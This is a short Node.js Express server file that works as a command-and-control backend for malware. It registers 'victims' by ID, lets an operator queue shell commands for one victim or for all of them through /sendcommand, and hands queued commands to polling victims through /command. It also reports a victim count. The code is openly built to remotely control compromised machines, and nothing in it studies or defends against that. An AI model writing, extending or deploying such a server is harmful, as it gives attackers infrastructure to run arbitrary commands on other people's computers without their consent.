const express = require('express');
const bodyparser = require('body-parser');
const victimDB = require('./victimdb');

const PORT = process.env.PORT || 5000;
app = express();
bodyparser.set
app.use(bodyparser.urlencoded({extended:true}));
app.listen(PORT);

const defaultCommand = "echo hello";

app.get("/registervictim/:victimID", (req, res) => {
  victimDB.addVictim(req.params.victimID);
  res.send("");
})

app.get("/command(/:victimID)?",(req, res) =>{
  let victimID = req.params.victimID;
  if (victimID) victimDB.addVictim(victimID);
  let target = victimDB.getVictim(victimID);
  let command = target ? (victimDB.getNextCommand(target) || defaultCommand) : defaultCommand;
  if (command != defaultCommand) {
    console.log("Sending command: ", command);
    console.log("To victim: ", target);
  }
  res.send(command);
});

app.get("/sendcommand/:command", (req, res) => {
  victimDB.addMassCommand(req.params.command);
  res.send("Success");
});

app.post("/sendcommand", (req, res) => {
  let target = req.body.target;
  let command = req.body.command;
  target ? victimDB.addCommand(command, target) : victimDB.addMassCommand(command);
  console.log("Added: ",command);
  res.send(command);
});

app.get("/victimcount", (req, res) => {
  res.send(""+victimDB.getVictimCount());
});

app.use(express.static(__dirname + '/public/'));
